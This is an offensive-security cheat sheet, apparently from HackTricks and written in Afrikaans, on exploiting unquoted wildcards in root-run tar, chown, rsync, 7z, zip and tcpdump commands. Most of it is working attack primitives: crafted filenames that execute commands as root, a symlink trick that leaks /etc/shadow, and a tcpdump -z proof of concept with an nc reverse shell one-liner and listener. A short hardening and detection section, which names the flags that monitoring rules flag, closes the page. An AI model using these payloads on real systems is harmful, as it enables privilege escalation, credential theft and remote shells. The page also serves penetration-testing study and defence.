# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (ook bekend as *glob*) **argumentinjekie** gebeur wanneer 'n bevoorregte skrip 'n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … met 'n ongekwote wildcard soos `*` uitvoer. 
> Aangesien die skulp die wildcard **voor** die uitvoering van die binary uitbrei, kan 'n aanvaller wat lêers in die werksgids kan skep, lêername saamstel wat met `-` begin sodat dit as **opsies in plaas van data** geïnterpreteer word, wat effektief arbitrêre vlae of selfs opdragte smokkel. 
> Hierdie bladsy versamel die nuttigste primitiewe, onlangse navorsing en moderne opsporings vir 2023-2025.

## chown / chmod

Jy kan **die eienaar/groep of die toestemmingsbits van 'n arbitrêre lêer kopieer** deur die `--reference` vlag te misbruik:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wanneer root later iets soos uitvoer:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` word ingesluit, wat veroorsaak dat *alle* ooreenstemmende lêers die eienaarskap/permitte van `/root/secret``file` erf.

*PoC & hulpmiddel*: [`wildpwn`](https://github.com/localh0t/wildpwn) (gecombineerde aanval).
Sien ook die klassieke DefenseCode papier vir besonderhede.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Voer arbitrêre opdragte uit deur die **checkpoint** kenmerk te misbruik:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sodra root `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.

### bsdtar / macOS 14+

Die standaard `tar` op onlangse macOS (gebaseer op `libarchive`) implementeer *nie* `--checkpoint` nie, maar jy kan steeds kode-uitvoering bereik met die **--use-compress-program** vlag wat jou toelaat om 'n eksterne kompressor te spesifiseer.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wanneer 'n bevoorregte skrif `tar -cf backup.tar *` uitvoer, sal `/bin/sh` begin.

---

## rsync

`rsync` laat jou toe om die afstandshell of selfs die afstandsbinary te oorskry via opdraglynvlaggies wat met `-e` of `--rsync-path` begin:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
As root later die gids met `rsync -az * backup:/srv/` argiveer, laat die ingeslote vlag jou skulp op die afstand kant ontstaan.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` modus).

---

## 7-Zip / 7z / 7za

Selfs wanneer die bevoorregte skrif *defensief* die wildcard met `--` voorafgaan (om opsie-parsing te stop), ondersteun die 7-Zip formaat **lêerlys lêers** deur die lêernaam met `@` vooraf te gaan. Om dit te kombineer met 'n symlink laat jou toe om *arbitraire lêers te exfiltreer*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
As die root iets soos uitvoer:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as 'n lêerlys te lees en sal uitval, **die inhoud na stderr druk**.

---

## zip

`zip` ondersteun die vlag `--unzip-command` wat *woordeliks* aan die stelselshell oorgedra word wanneer die argief getoets sal word:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject die vlag via 'n vervaardigde lêernaam en wag vir die bevoorregte rugsteun-skrip om `zip -T` (toets argief) op die resultaat lêer aan te roep.

---

## Bykomende binaire wat kwesbaar is vir wildcard-inspuiting (2023-2025 vinnige lys)

Die volgende opdragte is in moderne CTFs en werklike omgewings misbruik. Die payload word altyd geskep as 'n *lêernaam* binne 'n skryfbare gids wat later met 'n wildcard verwerk sal word:

| Binaire | Vlag om te misbruik | Effek |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrêre `@file` | Lees lêerinhoud |
| `flock` | `-c <cmd>` | Voer opdrag uit |
| `git`   | `-c core.sshCommand=<cmd>` | Opdrag uitvoering via git oor SSH |
| `scp`   | `-S <cmd>` | Genereer arbitrêre program in plaas van ssh |

Hierdie primitiewe is minder algemeen as die *tar/rsync/zip* klassiekers, maar dit is die moeite werd om te kyk wanneer jy jag.

---

## tcpdump rotasie haakies (-G/-W/-z): RCE via argv inspuiting in wrappers

Wanneer 'n beperkte skulp of verskaffer wrapper 'n `tcpdump` opdraglyn bou deur gebruikersbeheerde velde (bv. 'n "lêernaam" parameter) te konkateer sonder streng aanhaling/validasie, kan jy ekstra `tcpdump` vlaggies smokkel. Die kombinasie van `-G` (tyd-gebaseerde rotasie), `-W` (beperk aantal lêers), en `-z <cmd>` (post-rotate opdrag) lei tot arbitrêre opdrag uitvoering as die gebruiker wat tcpdump uitvoer (dikwels root op toestelle).

Voorwaardes:

- Jy kan `argv` beïnvloed wat aan `tcpdump` oorgedra word (bv. via 'n wrapper soos `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Die wrapper saniteer nie spaties of `-`-geprefikse tokens in die lêernaam veld nie.

Klassieke PoC (voert 'n omgekeerde skulp skrip uit vanaf 'n skryfbare pad):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` dwing 'n onmiddellike rotasie na die eerste ooreenstemmende pakket.
- `-z <cmd>` voer die post-rotasie opdrag een keer per rotasie uit. Baie boue voer `<cmd> <savefile>` uit. As `<cmd>` 'n skrip/interpreter is, verseker dat die argument hantering ooreenstem met jou payload.

No-removable-media variasies:

- As jy enige ander primitiewe het om lêers te skryf (bv. 'n aparte opdrag-wrapper wat uitvoer herleiding toelaat), plaas jou skrip in 'n bekende pad en aktiveer `-z /bin/sh /path/script.sh` of `-z /path/script.sh` afhangende van platform semantiek.
- Sommige verskaffer wrappers roteer na aanvaller-beheerde plekke. As jy die geroteerde pad kan beïnvloed (symlink/gids traversering), kan jy `-z` stuur om inhoud uit te voer wat jy heeltemal beheer sonder eksterne media.

Hardening wenke vir verskaffers:

- Moet nooit gebruiker-beheerde strings direk aan `tcpdump` (of enige hulpmiddel) oorhandig sonder streng toelaatlys. Citeer en valideer.
- Moet nie `-z` funksionaliteit in wrappers blootstel nie; voer tcpdump uit met 'n vaste veilige sjabloon en verbied ekstra vlae heeltemal.
- Laat tcpdump voorregte val (cap_net_admin/cap_net_raw slegs) of voer onder 'n toegewyde onvoorregte gebruiker met AppArmor/SELinux beperking uit.

## Detection & Hardening

1. **Deaktiveer shell globbing** in kritieke skripte: `set -f` (`set -o noglob`) voorkom wildcard uitbreiding.
2. **Citeer of ontsnap** argumente: `tar -czf "$dst" -- *` is *nie* veilig nie — verkies `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Expliciete paaie**: Gebruik `/var/www/html/*.log` in plaas van `*` sodat aanvallers nie suster lêers kan skep wat met `-` begin nie.
4. **Minste voorreg**: Voer rugsteun/onderhoud werksgeleenthede uit as 'n onvoorregte diensrekening in plaas van root wanneer moontlik.
5. **Monitering**: Elastic se voorafgeboude reël *Potensiële Shell via Wildcard Inspuiting* soek na `tar --checkpoint=*`, `rsync -e*`, of `zip --unzip-command` onmiddellik gevolg deur 'n shell kind proses. Die EQL navraag kan aangepas word vir ander EDRs.

---

## References

* Elastic Security – Potensiële Shell via Wildcard Inspuiting Gediagnoseer reël (laas opgedateer 2025)
* Rutger Flohil – “macOS — Tar wildcard inspuiting” (18 Des 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Volledige Exploit Ketting](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
